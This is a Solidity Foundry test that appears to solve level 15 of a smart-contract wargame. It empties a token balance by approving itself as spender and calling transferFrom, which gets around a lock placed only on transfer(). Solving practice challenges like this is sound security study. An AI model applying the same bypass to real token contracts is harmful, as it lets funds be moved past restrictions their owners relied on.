// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Level15.sol";

contract Level15Test is Test {
    Level15 public level15;

    function setUp() public {
      // Add ether
      vm.deal(vm.addr(1), 6 ether);

      // Deploy contract, and add 1 ether into addr 1 account
      vm.startPrank(vm.addr(1));
      level15 = new Level15(vm.addr(1));
      vm.stopPrank();
    }

    function testLevel15() public {
      vm.startPrank(vm.addr(1));

      uint256 totalBalance = level15.balanceOf(vm.addr(1));

      //use transferFrom, first approve ourself as spender, then call transferFrom
      level15.approve(vm.addr(1), totalBalance);
      level15.transferFrom(vm.addr(1), vm.addr(2), totalBalance);

      console.log("remaining", level15.balanceOf(vm.addr(1)));
      vm.stopPrank();
    }
}
